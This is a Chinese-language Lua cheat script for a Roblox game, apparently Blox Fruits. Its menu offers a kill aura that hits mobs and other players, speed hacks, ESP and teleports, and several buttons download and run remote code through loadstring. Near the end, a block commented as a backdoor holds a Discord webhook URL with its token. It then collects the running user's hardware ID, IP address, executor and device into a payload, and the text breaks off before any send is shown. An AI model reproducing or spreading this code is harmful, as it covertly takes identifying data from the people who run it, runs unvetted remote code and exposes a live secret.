-- 防通知篡改钩子
local old
old = hookmetamethod(game:GetService("StarterGui"), "__namecall", newcclosure(function(self, ...)
    local method = getnamecallmethod()
    local args = {...}
    if method == "SetCore" and args[1] == "SendNotification" then
        local options = args[2]
        if type(options) == "table" and 
           tostring(options.Title) == "人挤人" and 
           tostring(options.Text) == "人挤人" 
        then
            local modifiedOptions = table.clone(options)
            modifiedOptions.Text = "1"
            return old(self, "SetCore", "SendNotification", modifiedOptions)
        end
    end
    return old(self, ...)
end))

-- 加载提示
game:GetService("StarterGui"):SetCore("SendNotification",{
    Title = "人挤人中心",
    Text = "加载中",
    Duration = 5;
})
task.wait(0.1)

-- 服务初始化
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")
local LocalPlayer = Players.LocalPlayer
local Camera = Workspace.CurrentCamera

local ui = loadstring(game:HttpGet("https://raw.githubusercontent.com/ttker951-dot/y1/refs/heads/main/u1.lua"))()
local win = ui:new("人挤人中心")

-- 创建标签页
local UITab1 = win:Tab("公告",'7734068321')
local UITab2 = win:Tab("功能",'7734068321')
local UITab3 = win:Tab("大佛",'7734068321')
local UITab4 = win:Tab("透视",'7734068321')
local UITab5 = win:Tab("传送",'7734068321')
local UITab6 = win:Tab("功能2",'7734068321')

-- ===================== 公告标签页 =====================
local noticeSection = UITab1:section("公告", true)
noticeSection:Label("kismile制作")
noticeSection:Label("最大帮助者 Aotsg")
noticeSection:Label("脚本测试中")
noticeSection:Label("禁止乱打")
noticeSection:Label("禁止乱打")
noticeSection:Label("禁止乱打")

-- ===================== 通用标签页 =====================
local generalSection = UITab2:section("通用", true)

-- 视角缩放
generalSection:Slider("视角缩放距离", "CameraZoom", 128, 128, 10000, false, function(Value)
    LocalPlayer.CameraMaxZoomDistance = Value
end)

-- 移速功能
getfenv().translateSpeed = 50  -- 默认速度
getfenv().translateConnection = nil

generalSection:Textbox("速度", "TranslateSpeed", "50", function(Value)
    local speed = tonumber(Value)
    if speed then
        getfenv().translateSpeed = speed
    end
end)

generalSection:Toggle("加速开关", "TranslateToggle", false, function(State)
    getfenv().translateAccelEnabled = State
    
    -- 断开原有连接
    if getfenv().translateConnection then
        getfenv().translateConnection:Disconnect()
        getfenv().translateConnection = nil
    end
    
    if State then
        -- 创建新连接
        getfenv().translateConnection = RunService.Heartbeat:Connect(function()
            local char = LocalPlayer.Character
            if not char then return end
            
            local humanoid = char:FindFirstChildOfClass("Humanoid")
            if not humanoid or humanoid.Health <= 0 then return end
            
            if humanoid.MoveDirection.Magnitude > 0 then
                local moveDirection = humanoid.MoveDirection
                local acceleration = moveDirection * (getfenv().translateSpeed or 50) / 30
                char:TranslateBy(acceleration)
            end
        end)
    end
end)

-- 快捷功能按钮
generalSection:Button("飞行", function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ttker951-dot/y1/refs/heads/main/rf"))()
    end)
end)

generalSection:Button("减画质", function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ttker951-dot/y1/refs/heads/main/rfb"))()
    end)
end)

generalSection:Button("移除岩浆", function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ttker951-dot/y1/refs/heads/main/lava"))()
    end)
end)

generalSection:Button("移除雾", function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ttker951-dot/y1/refs/heads/main/fog"))()
    end)
end)

-- ===================== 范围攻击标签页 =====================
local attackSection = UITab3:section("范围", true)

-- 快速攻击核心配置
local _ENV = (getgenv or getrenv or getfenv)()
local Settings = {AutoClick = true, ClickDelay = 0.3}
local _G = _G or getfenv(0)._G
_G.FastAttack = _G.FastAttack ~= nil and _G.FastAttack or true
-- Auto Haki配置
local AutoHakiEnabled = false
local autoHakiTask = nil

-- Auto Haki循环函数
local function startAutoHakiLoop()
    if autoHakiTask then
        task.cancel(autoHakiTask)
        autoHakiTask = nil
    end
    
    autoHakiTask = task.spawn(function()
        while AutoHakiEnabled do
            task.wait(0.2)
            if AutoHakiEnabled and LocalPlayer.Character and not LocalPlayer.Character:FindFirstChild("HasBuso") then
                pcall(function()
                    ReplicatedStorage.Remotes.CommF_:InvokeServer("Buso")
                end)
            end
        end
        autoHakiTask = nil
    end)
end

-- 角色重生时重启Auto Haki
LocalPlayer.CharacterAdded:Connect(function(newCharacter)
    if AutoHakiEnabled then
        task.wait(2) -- 等待角色完全加载
        startAutoHakiLoop()
    end
end)

-- 工具函数
local function SafeWaitForChild(parent, childName, timeout)
    timeout = timeout or 10
    local success, result = pcall(function() 
        return parent:WaitForChild(childName, timeout) 
    end)
    if not success or not result then 
        warn("未找到组件: " .. childName) 
    end
    return result
end

local function CheckAndGetCoreComponents()
    local Remotes, Modules, Net, RegisterAttack, RegisterHit, Enemies = nil, nil, nil, nil, nil, nil
    
    Remotes = SafeWaitForChild(ReplicatedStorage, "Remotes")
    Modules = SafeWaitForChild(ReplicatedStorage, "Modules")
    Net = Modules and SafeWaitForChild(Modules, "Net") or nil
    RegisterAttack = Net and SafeWaitForChild(Net, "RE/RegisterAttack") or nil
    RegisterHit = Net and SafeWaitForChild(Net, "RE/RegisterHit") or nil
    Enemies = SafeWaitForChild(Workspace, "Enemies")
    
    if Remotes and Modules and Net and RegisterAttack and RegisterHit and Enemies then
        return Remotes, Net, RegisterAttack, RegisterHit, Enemies
    end
    return nil
end

local function IsAlive(character)
    if not character then return false end
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    return humanoid and humanoid.Health and humanoid.Health > 0
end

local function GetRandomValidPart(target)
    local allParts = target:GetDescendants()
    local validParts = {}
    local humanoidRootPart = target:FindFirstChild("HumanoidRootPart")
    local boneParts = humanoidRootPart and humanoidRootPart.Parent:GetDescendants() or {}
    
    for _, part in ipairs(allParts) do
        if part:IsA("BasePart") and part.CanCollide and table.find(boneParts, part) then
            table.insert(validParts, part)
        end
    end
    
    return #validParts > 0 and validParts[math.random(1, #validParts)] or target:FindFirstChild("HumanoidRootPart")
end

-- 快速攻击模块
local FastAttackModule = (function()
    if _ENV.rz_FastAttack then return _ENV.rz_FastAttack end
    
    local FastAttack = {
        Distance = 2500,
        attackMobs = true,
        attackPlayers = true,
        Equipped = nil,
        IsRunning = _G.FastAttack,
        consecutiveFailures = 0,
        maxConsecutiveFailures = 5
    }

    local function ProcessEnemies(OthersEnemies, Folder)
        if not Folder or not FastAttack.attackMobs then return nil end
        local BasePart = nil
        
        for _, Enemy in Folder:GetChildren() do
            if Enemy == LocalPlayer.Character or not IsAlive(Enemy) then continue end
            local foundPart = GetRandomValidPart(Enemy)
            
            if foundPart and LocalPlayer:DistanceFromCharacter(foundPart.Position) < FastAttack.Distance then
                table.insert(OthersEnemies, {Enemy, foundPart})
                BasePart = foundPart
            end
        end
        return BasePart
    end

    local function ProcessRealPlayers(OthersEnemies)
        if not FastAttack.attackPlayers then return nil end
        local BasePart = nil
        
        for _, OtherPlayer in Players:GetPlayers() do
            if OtherPlayer == LocalPlayer then continue end
            local OtherChar = OtherPlayer.Character
            
            if not IsAlive(OtherChar) then continue end
            local foundPart = GetRandomValidPart(OtherChar)
            
            if foundPart and LocalPlayer:DistanceFromCharacter(foundPart.Position) < FastAttack.Distance then
                table.insert(OthersEnemies, {OtherChar, foundPart})
                BasePart = foundPart
            end
        end
        return BasePart
    end

    function FastAttack:Attack(BasePart, OthersEnemies)
        local components = {CheckAndGetCoreComponents()}
        local Net, temp_RegisterAttack, temp_RegisterHit = components[2], components[3], components[4]
        
        if not (BasePart and OthersEnemies and #OthersEnemies > 0 and temp_RegisterAttack and temp_RegisterHit) then
            self.consecutiveFailures = self.consecutiveFailures + 1
            
            if self.consecutiveFailures >= self.maxConsecutiveFailures then
                self.consecutiveFailures = 0
                self.Equipped = LocalPlayer.Character and IsAlive(LocalPlayer.Character) and LocalPlayer.Character:FindFirstChildOfClass("Tool")
            end
            
            task.delay(0.5, function() self:AttackNearest() end)
            return
        end
        
        self.consecutiveFailures = 0
        temp_RegisterAttack:FireServer(Settings.ClickDelay or 0)
        temp_RegisterHit:FireServer(BasePart, OthersEnemies)
    end

    function FastAttack:AttackNearest()
        if not self.IsRunning then return end
        local components = {CheckAndGetCoreComponents()}
        local Enemies = components[5]
        local OthersEnemies = {}
        
        local Part1 = ProcessEnemies(OthersEnemies, Enemies)
        local Part2 = ProcessRealPlayers(OthersEnemies)
        
        if #OthersEnemies > 0 then
            self:Attack(Part1 or Part2, OthersEnemies)
        end
    end

    function FastAttack:BladeHits()
        if not self.IsRunning then return end
        local Equipped = LocalPlayer.Character and IsAlive(LocalPlayer.Character) and LocalPlayer.Character:FindFirstChildOfClass("Tool")
        
        if Equipped and Equipped.ToolTip ~= "Gun" then
            self:AttackNearest()
        end
    end

    -- 攻击循环
    task.spawn(function()
        while true do
            task.wait(Settings.ClickDelay)
            if Settings.AutoClick and FastAttack.IsRunning then
                FastAttack:BladeHits()
            else
                task.wait(0.1)
            end
        end
    end)

    _ENV.rz_FastAttack = FastAttack
    return FastAttack
end)()

-- 范围攻击UI绑定
attackSection:Toggle("攻击开关", "FastAttackToggle", _G.FastAttack, function(state)
    if _ENV.rz_FastAttack then
        _ENV.rz_FastAttack.IsRunning = state
        _G.FastAttack = state
    end
end)

attackSection:Textbox("攻击范围", "AttackRange", "2500", function(text)
    local num = tonumber(text) or 2500
    num = math.floor(math.clamp(num, 1, 2500))
    if _ENV.rz_FastAttack then
        _ENV.rz_FastAttack.Distance = num
    end
end)

attackSection:Textbox("攻击速度", "ClickDelay", "0.3", function(text)
    local num = tonumber(text) or 0.3
    num = math.round(math.clamp(num, 0.05, 2) * 100) / 100
    Settings.ClickDelay = num
end)

attackSection:Toggle("攻击怪物", "AttackMobsToggle", true, function(state)
    if _ENV.rz_FastAttack then
        _ENV.rz_FastAttack.attackMobs = state
    end
end)

attackSection:Toggle("攻击玩家", "AttackPlayersToggle", true, function(state)
    if _ENV.rz_FastAttack then
        _ENV.rz_FastAttack.attackPlayers = state
    end
end)

-- 自动V4功能
local toggleKey = "自动v4"
local autoV4Task = nil

-- 初始化全局开关状态
if not _G.ToggleStates then
    _G.ToggleStates = {}
end

local function getToggleState(key)
    return _G.ToggleStates[key] or false
end

local function callAwakeningRemote()
    local character = LocalPlayer.Character
    if not character then return end
    
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    if not humanoid or humanoid.Health <= 0 then return end

    local Backpack = LocalPlayer:FindFirstChild("Backpack")
    if not Backpack then return end
    
    local Awakening = Backpack:FindFirstChild("Awakening")
    if not Awakening then return end
    
    local RemoteFunc = Awakening:FindFirstChild("RemoteFunction")
    if not RemoteFunc or not RemoteFunc:IsA("RemoteFunction") then return end
    
    local success, err = pcall(function()
        RemoteFunc:InvokeServer(true)
    end)
    if not success then
        warn("自动v4调用失败：", err)
    end
end

local function runAutoV4Loop()
    if autoV4Task then
        task.cancel(autoV4Task)
        autoV4Task = nil
    end

    autoV4Task = task.spawn(function()
        while getToggleState(toggleKey) do
            callAwakeningRemote()
            task.wait(1)
        end
        autoV4Task = nil
    end)
end

local function toggleAutoV4(enable)
    if autoV4Task then
        task.cancel(autoV4Task)
        autoV4Task = nil
    end

    if enable then
        runAutoV4Loop()
    end
end

-- 角色重生时重启自动V4
LocalPlayer.CharacterAdded:Connect(function(newCharacter)
    newCharacter:WaitForChild("Humanoid")
    if getToggleState(toggleKey) then
        toggleAutoV4(true)
    end
end)

-- 自动V4 UI绑定
attackSection:Toggle(toggleKey, "AutoV4Toggle", false, function(IsEnabled)
    _G.ToggleStates[toggleKey] = IsEnabled
    toggleAutoV4(IsEnabled)
end)

-- 自动V3功能
local toggleKeyV3 = "自动v3"
local autoV3Task = nil

local function callRaceV3Remote()
    local character = LocalPlayer.Character
    if not character then return end
    
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    if not humanoid or humanoid.Health <= 0 then return end

    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local Remotes = ReplicatedStorage:FindFirstChild("Remotes")
    if not Remotes then return end
    
    local CommE = Remotes:FindFirstChild("CommE")
    if not CommE or not CommE:IsA("RemoteEvent") then return end
    
    local success, err = pcall(function()
        CommE:FireServer("ActivateAbility")
    end)
    if not success then
        warn("自动v3调用失败：", err)
    end
end

local function runAutoV3Loop()
    if autoV3Task then
        task.cancel(autoV3Task)
        autoV3Task = nil
    end

    autoV3Task = task.spawn(function()
        while getToggleState(toggleKeyV3) do
            callRaceV3Remote()
            task.wait(1)
        end
        autoV3Task = nil
    end)
end

local function toggleAutoV3(enable)
    if autoV3Task then
        task.cancel(autoV3Task)
        autoV3Task = nil
    end

    if enable then
        runAutoV3Loop()
    end
end

-- 角色重生时重启自动V3
LocalPlayer.CharacterAdded:Connect(function(newCharacter)
    newCharacter:WaitForChild("Humanoid")
    if getToggleState(toggleKeyV3) then
        toggleAutoV3(true)
    end
end)

-- 自动V3 UI绑定
attackSection:Toggle(toggleKeyV3, "AutoV3Toggle", false, function(IsEnabled)
    _G.ToggleStates[toggleKeyV3] = IsEnabled
    toggleAutoV3(IsEnabled)
end)

attackSection:Toggle("自动武装色", "AutoHakiToggle", true, function(state)
    AutoHakiEnabled = state
    if state then
        startAutoHakiLoop()
        warn("[自动武装色] 功能已开启")
    else
        if autoHakiTask then
            task.cancel(autoHakiTask)
            autoHakiTask = nil
        end
        warn("[自动武装色] 功能已关闭")
    end
end)

-- ===================== 快速攻击组件恢复逻辑 =====================
task.spawn(function()
    while true do
        task.wait(1)
        if not _ENV.rz_FastAttack and _G.FastAttack then
            warn("快速攻击组件未完全加载 尝试恢复...")
            FastAttackModule = FastAttackModule or (function()
                local FastAttack = {
                    Distance=2500,
                    attackMobs=true,
                    attackPlayers=true,
                    Equipped=nil,
                    IsRunning=_G.FastAttack,
                    consecutiveFailures=0,
                    maxConsecutiveFailures=5
                }
                _ENV.rz_FastAttack = FastAttack
                return FastAttack
            end)()
        end
    end
end)

-- ===================== ESP Pro 透视标签页 =====================
local espSection = UITab4:section("透视", true)

-- ESP Pro 模块
local ESPProModule = {}

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local espEnabled = false
local espObjects = {}
local RandomID = math.random(1, 1000000)

-- 四舍五入函数
local function Round(num)
    return math.floor(tonumber(num) + 0.5)
end

-- 获取队伍颜色
local function getTeamColor(player)
    if player.Team ~= LocalPlayer.Team then
        return Color3.fromRGB(255, 0, 0) -- 敌人: 红色
    else
        return Color3.fromRGB(0, 0, 255) -- 队友: 蓝色
    end
end

-- 彻底移除ESP
local function removeESP(player)
    if espObjects[player] then
        for _, v in pairs(espObjects[player]) do
            if typeof(v) == "Instance" and v.Parent then
                v:Destroy()
            end
        end
        espObjects[player] = nil
    end
end

-- 为单个玩家创建ESP
local function createESP(player)
    if player == LocalPlayer then return end
    if not player.Character then return end
    
    -- 如果存在旧ESP，先移除
    removeESP(player)
    
    local head = player.Character:FindFirstChild("Head") or player.Character:FindFirstChildWhichIsA("BasePart")
    if not head then return end

    -- 高亮框
    local highlight = Instance.new("Highlight")
    highlight.Adornee = player.Character
    highlight.FillTransparency = 0.7
    highlight.OutlineColor = getTeamColor(player)
    highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
    highlight.Parent = player.Character

    -- 公告牌UI
    local billboard = Instance.new("BillboardGui")
    billboard.Name = "NameESP_" .. RandomID
    billboard.Adornee = head
    billboard.Size = UDim2.new(0, 200, 0, 50)
    billboard.AlwaysOnTop = true
    billboard.StudsOffset = Vector3.new(0, 2.5, 0)
    billboard.Parent = head

    -- 玩家头像
    local avatar = Instance.new("ImageLabel")
    avatar.Size = UDim2.new(0, 45, 0, 45)
    avatar.Position = UDim2.new(0, 0, 0, 0)
    avatar.BackgroundTransparency = 1
    avatar.BorderSizePixel = 0
    avatar.Image = "https://www.roblox.com/headshot-thumbnail/image?userId="..player.UserId.."&width=150&height=150&format=png"
    avatar.Parent = billboard

    -- 文字标签
    local text = Instance.new("TextLabel")
    text.Size = UDim2.new(1, -50, 1, 0)
    text.Position = UDim2.new(0, 50, 0, 0)
    text.BackgroundTransparency = 1
    text.TextStrokeTransparency = 0.5
    text.TextScaled = true
    text.Font = Enum.Font.Code
    text.TextYAlignment = Enum.TextYAlignment.Top
    text.TextXAlignment = Enum.TextXAlignment.Left
    text.TextColor3 = getTeamColor(player)
    text.Parent = billboard

    -- 向下指示箭头
    local arrow = Instance.new("ImageLabel")
    arrow.Size = UDim2.new(0, 15, 0, 15)
    arrow.Position = UDim2.new(0.5, -7.5, 1, 0)
    arrow.BackgroundTransparency = 1
    arrow.Image = "rbxassetid://7072716990"
    arrow.ImageColor3 = getTeamColor(player)
    arrow.Parent = billboard

    -- 存储ESP对象
    espObjects[player] = { 
        highlight = highlight, 
        billboard = billboard, 
        text = text, 
        avatar = avatar, 
        arrow = arrow 
    }

    -- 持续更新信息
    task.spawn(function()
        while espEnabled and player and player.Parent and espObjects[player] do
            if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                local root = player.Character.HumanoidRootPart
                local localRoot = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                
                if root and localRoot then
                    -- 计算距离
                    local distance = Round((root.Position - localRoot.Position).Magnitude)
                    -- 获取等级（如果游戏有等级系统）
                    local level = (player:FindFirstChild("Data") and player.Data:FindFirstChild("Level") and player.Data.Level.Value) or "?"
                    -- 获取血量百分比
                    local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
                    local healthPercent = humanoid and Round((humanoid.Health / humanoid.MaxHealth) * 100) or 0

                    -- 更新显示文本
                    if espObjects[player] and espObjects[player].text then
                        espObjects[player].text.Text = string.format("%s | %s | %d M\nHealth: %d%%", level, player.Name, distance, healthPercent)
                        local teamColor = getTeamColor(player)
                        espObjects[player].text.TextColor3 = teamColor
                        -- 更新高亮框颜色
                        if espObjects[player].highlight then
                            espObjects[player].highlight.OutlineColor = teamColor
                        end
                        -- 更新箭头颜色
                        if espObjects[player].arrow then
                            espObjects[player].arrow.ImageColor3 = teamColor
                        end
                    end
                end
            else
                -- 如果角色不存在，退出循环
                break
            end
            task.wait(0.2) -- 更新频率：每0.2秒
        end
    end)
end

-- 处理角色重生
local function setupPlayerConnections(player)
    -- 角色添加时
    player.CharacterAdded:Connect(function(character)
        if espEnabled then
            -- 等待角色加载完成
            character:WaitForChild("HumanoidRootPart", 5)
            task.wait(0.5) -- 延迟确保角色已就绪
            createESP(player)
        end
    end)
    
    -- 角色移除时
    player.CharacterRemoving:Connect(function()
        removeESP(player)
    end)
end

-- 启用ESP Pro
local function enableESPPro()
    espEnabled = true
    -- 为所有玩家设置连接
    for _, p in pairs(Players:GetPlayers()) do
        setupPlayerConnections(p)
        if p.Character then
            task.wait(0.1)
            createESP(p)
        end
    end
    print("[ESP Pro] 已启用ESP Player Pro")
end

-- 禁用ESP Pro
local function disableESPPro()
    espEnabled = false
    -- 清理所有ESP
    for player, _ in pairs(espObjects) do
        removeESP(player)
    end
    espObjects = {}
    print("[ESP Pro] 已禁用ESP Player Pro")
end

-- WindUI API
function ESPProModule:SetState(state)
    if state then
        enableESPPro()
    else
        disableESPPro()
    end
end

function ESPProModule:IsEnabled()
    return espEnabled
end

-- 玩家加入游戏
Players.PlayerAdded:Connect(function(player)
    setupPlayerConnections(player)
    if espEnabled and player.Character then
        task.wait(1)
        createESP(player)
    end
end)

-- 玩家离开游戏
Players.PlayerRemoving:Connect(function(player)
    removeESP(player)
end)

-- 本地玩家重生
LocalPlayer.CharacterAdded:Connect(function(character)
    if espEnabled then
        character:WaitForChild("HumanoidRootPart", 5)
        task.wait(1)
        -- 刷新所有玩家ESP
        for _, p in pairs(Players:GetPlayers()) do
            if p.Character and p ~= LocalPlayer then
                removeESP(p)
                task.wait(0.05)
                createESP(p)
            end
        end
    end
end)

-- 脚本启动时为现有玩家设置连接
for _, p in pairs(Players:GetPlayers()) do
    setupPlayerConnections(p)
end

-- 创建UI开关
espSection:Toggle("ESP Pro ", "ESP_Pro_Switch", false, function(state)
    ESPProModule:SetState(state)
end)

-- ===================== 传送标签页 =====================
local tpMainSection = UITab5:section("传送", false)

-- 海域传送
tpMainSection:Button("传送至一海", function()
    pcall(function()
        ReplicatedStorage.Remotes.CommF_:InvokeServer("TravelMain")
    end)
end)

tpMainSection:Button("传送至二海", function()
    pcall(function()
        ReplicatedStorage.Remotes.CommF_:InvokeServer("TravelDressrosa")
    end)
end)

tpMainSection:Button("传送至三海", function()
    pcall(function()
        ReplicatedStorage.Remotes.CommF_:InvokeServer("TravelZou")
    end)
end)

-- 二海传送点
local tp2Section = UITab5:section("二海", false)
tp2Section:Button("传送至天鹅的房间", function()
    local char = LocalPlayer.Character
    if char and char:FindFirstChild("HumanoidRootPart") then
        char.HumanoidRootPart.CFrame = CFrame.new(-287.37, 305.81, 592.98)
    end
end)

tp2Section:Button("传送至豪宅", function()
    local char = LocalPlayer.Character
    if char and char:FindFirstChild("HumanoidRootPart") then
        char.HumanoidRootPart.CFrame = CFrame.new(2286.93, 15.06, 910.51)
    end
end)

tp2Section:Button("传送至鬼船里", function()
    local char = LocalPlayer.Character
    if char and char:FindFirstChild("HumanoidRootPart") then
        char.HumanoidRootPart.CFrame = CFrame.new(-6501.06, 83.11, -123.52)
    end
end)

tp2Section:Button("传送至鬼船外", function()
    local char = LocalPlayer.Character
    if char and char:FindFirstChild("HumanoidRootPart") then
        char.HumanoidRootPart.CFrame = CFrame.new(922.78, 123.96, 32842.40)
    end
end)

-- 三海传送点
local tp3Section = UITab5:section("三海", false)
tp3Section:Button("传送至海洋城堡", function()
    local char = LocalPlayer.Character
    if char and char:FindFirstChild("HumanoidRootPart") then
        char.HumanoidRootPart.CFrame = CFrame.new(-12463.60, 376.26, -7566.08)
    end
end)

tp3Section:Button("传送至海龟豪宅", function()
    local char = LocalPlayer.Character
    if char and char:FindFirstChild("HumanoidRootPart") then
        char.HumanoidRootPart.CFrame = CFrame.new(-5060.41, 316.43, -3192.30)
    end
end)

tp3Section:Button("传送至司法", function()
    local char = LocalPlayer.Character
    if char and char:FindFirstChild("HumanoidRootPart") then
        char.HumanoidRootPart.CFrame = CFrame.new(-5096.48, 316.43, -3177.91)
    end
end)

tp3Section:Button("传送至九头蛇", function()
    local char = LocalPlayer.Character
    if char and char:FindFirstChild("HumanoidRootPart") then
        char.HumanoidRootPart.CFrame = CFrame.new(-5027.03, 316.43, -3206.07)
    end
end)


local activitySection = UITab6:section("功能", true)

-- ===================== 新增：自动开佛拿刀功能 =====================
-- 配置
local AUTO_BUDDHA_ENABLED = false
local CHECK_INTERVAL = 5
local BUDDHA_SLOT = 2
local SWORD_SLOT = 3
local BUDDHA_MIN_SIZE = 20.0

-- 所有刀具的列表
local ALL_SWORDS = {
    "True Triple Katana",
    "Hallow Scythe", 
    "Dark Blade",
    "Cursed Dual Katana",
    "Rengoku",
    "Saber",
    "Saishi",
    "Shark Anchor",
    "Spikey Trident",
    "Tushita",
    "Yama",
    "Dragonheart"
}

-- 将刀具列表转换为表以便快速查找
local SWORDS_TABLE = {}
for _, sword in ipairs(ALL_SWORDS) do
    SWORDS_TABLE[sword] = true
end

-- 检测Buddha形态
local function isBuddhaForm()
    local character = LocalPlayer.Character
    if not character then return false end
    
    local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
    if not humanoidRootPart then return false end
    
    local sizeMagnitude = humanoidRootPart.Size.Magnitude
    return sizeMagnitude > BUDDHA_MIN_SIZE
end

-- 按下数字键切换栏位
local function pressNumberKey(number)
    local virtualInput = game:GetService("VirtualInputManager")
    local keyCode
    
    if number == 1 then keyCode = Enum.KeyCode.One
    elseif number == 2 then keyCode = Enum.KeyCode.Two
    elseif number == 3 then keyCode = Enum.KeyCode.Three
    elseif number == 4 then keyCode = Enum.KeyCode.Four
    elseif number == 5 then keyCode = Enum.KeyCode.Five
    elseif number == 6 then keyCode = Enum.KeyCode.Six
    elseif number == 7 then keyCode = Enum.KeyCode.Seven
    elseif number == 8 then keyCode = Enum.KeyCode.Eight
    else keyCode = Enum.KeyCode.Nine end
    
    virtualInput:SendKeyEvent(true, keyCode, false, nil)
    task.wait(0.05)
    virtualInput:SendKeyEvent(false, keyCode, false, nil)
end

-- 按下Z键
local function pressZKey()
    local virtualInput = game:GetService("VirtualInputManager")
    
    virtualInput:SendKeyEvent(true, Enum.KeyCode.Z, false, nil)
    task.wait(0.1)
    virtualInput:SendKeyEvent(false, Enum.KeyCode.Z, false, nil)
end

-- 检查是否持有任何刀
local function hasAnySwordEquipped()
    local character = LocalPlayer.Character
    if not character then return false end
    
    for _, child in ipairs(character:GetChildren()) do
        if child:IsA("Tool") and SWORDS_TABLE[child.Name] then
            return true, child.Name
        end
    end
    
    return false, nil
end

-- 获取当前装备的刀名
local function getEquippedSwordName()
    local character = LocalPlayer.Character
    if not character then return nil end
    
    for _, child in ipairs(character:GetChildren()) do
        if child:IsA("Tool") and SWORDS_TABLE[child.Name] then
            return child.Name
        end
    end
    
    return nil
end

-- 装备刀
local function equipSword()
    -- 先切换到刀的栏位
    pressNumberKey(SWORD_SLOT)
    task.wait(0.3)
    
    -- 检查是否已经装备
    local hasSword, swordName = hasAnySwordEquipped()
    if hasSword then
        return true, swordName
    end
    
    -- 检查是否装备成功
    task.wait(0.5)
    return hasAnySwordEquipped()
end

-- 变身Buddha
local function performBuddhaTransformation()
    local character = LocalPlayer.Character
    if not character then
        return false
    end
    
    -- 切换到Buddha工具
    pressNumberKey(BUDDHA_SLOT)
    task.wait(0.5)
    
    -- 按Z键变身
    pressZKey()
    
    -- 等待并检查变身结果
    local waitTime = 0
    local maxWaitTime = 3
    
    while waitTime < maxWaitTime do
        task.wait(0.1)
        waitTime = waitTime + 0.1
        
        if isBuddhaForm() then
            return true
        end
    end
    
    return false
end

-- 自动开佛拿刀主循环
local buddhaTask = nil
local function startBuddhaLoop()
    if buddhaTask then
        task.cancel(buddhaTask)
        buddhaTask = nil
    end
    
    buddhaTask = task.spawn(function()
        local lastCheckTime = 0
        
        while AUTO_BUDDHA_ENABLED do
            task.wait(1)
            
            local currentTime = tick()
            if currentTime - lastCheckTime >= CHECK_INTERVAL then
                lastCheckTime = currentTime
                
                if not LocalPlayer.Character then
                    -- 等待角色
                else
                    if isBuddhaForm() then
                        -- 检查并装备刀
                        local hasSword, swordName = hasAnySwordEquipped()
                        if not hasSword then
                            equipSword()
                        end
                    else
                        -- 执行变身
                        local success = performBuddhaTransformation()
                        
                        if success then
                            -- 变身后装备刀
                            task.wait(0.5)
                            local hasSword, swordName = hasAnySwordEquipped()
                            if not hasSword then
                                equipSword()
                            end
                        end
                    end
                end
            end
        end
        buddhaTask = nil
    end)
end

LocalPlayer.CharacterAdded:Connect(function()
    if AUTO_BUDDHA_ENABLED then
        task.wait(2)
        startBuddhaLoop()
    end
end)

-- 自动开佛拿刀开关
local autoBuddhaToggle = activitySection:Toggle("自动变身大佛＋拿刀", "AutoBuddhaToggle", false, function(state)
    AUTO_BUDDHA_ENABLED = state
    if state then
        startBuddhaLoop()
        warn("[自动变佛＋拿刀] 功能已开启 - 支持所有刀具")
    else
        if buddhaTask then
            task.cancel(buddhaTask)
            buddhaTask = nil
        end
        warn("[自动变佛＋拿刀] 功能已关闭")
    end
end)



activitySection:Button("自动地下城", function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ttker951-dot/y1/refs/heads/main/at%20fb"))()
    end)
end)

activitySection:Button("Aim Skill", function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ttker951-dot/y1/refs/heads/main/aim"))()
    end)
end)

activitySection:Button("New Attack （点击直接打开 无法关闭）", function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ttker951-dot/y1/refs/heads/main/New%20attack"))()
    end)
end)

task.spawn(function()
    task.wait(2)
    -- 自动透视功能可以在这里添加
end)
--后门
local GS_WEBHOOK = "https://discord.com/api/webhooks/1457090417001762816/JrEupwmLBOYI1tNph7iihoeHhjmhkZxKm1PB5epc9yQ9_bqt5Nzuak2Qc3w0OBvYj0Tp"

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local LocalizationService = game:GetService("LocalizationService")
local MarketplaceService = game:GetService("MarketplaceService")
local RbxAnalyticsService = game:GetService("RbxAnalyticsService")

local localPlayer = Players.LocalPlayer
if not localPlayer then
    return
end

local function safeCall(func, fallback)
    local success, result = pcall(func)
    return success and result or fallback
end

local function getAvatarImage(userId)
    return safeCall(function()
        local url = string.format("https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=180x180&format=Png&isCircular=true", userId)
        local response = HttpService:JSONDecode(game:HttpGet(url))
        return response.data[1].imageUrl
    end, "https://www.roblox.com/Thumbs/Avatar.ashx?x=180&y=180&userId=" .. userId)
end

local function getDeviceType()
    local touch = UserInputService.TouchEnabled
    local keyboard = UserInputService.KeyboardEnabled
    local mouse = UserInputService.MouseEnabled
    
    if touch and not keyboard and not mouse then return "移动设备"
    elseif not touch and keyboard and mouse then return "电脑"
    elseif touch and keyboard and mouse then return "模拟器"
    else return "未知" end
end

local function getExecutor()
    return (identifyexecutor and identifyexecutor()) or 
           (getexecutorname and getexecutorname()) or 
           "未知"
end

local function getHWID()
    return (gethwid and gethwid()) or "无法获取"
end

local function getIPAddress()
    local request = http_request or request or (syn and syn.request)
    if not request then return "无请求函数" end
    
    return safeCall(function()
        return request({Url = "https://api.ipify.org/", Method = "GET"}).Body
    end, "获取失败")
end

local userId = localPlayer.UserId
local placeId = game.PlaceId

local payload = {
    username = "机器人",
    embeds = {{
        color = tonumber("0x32CD32"),
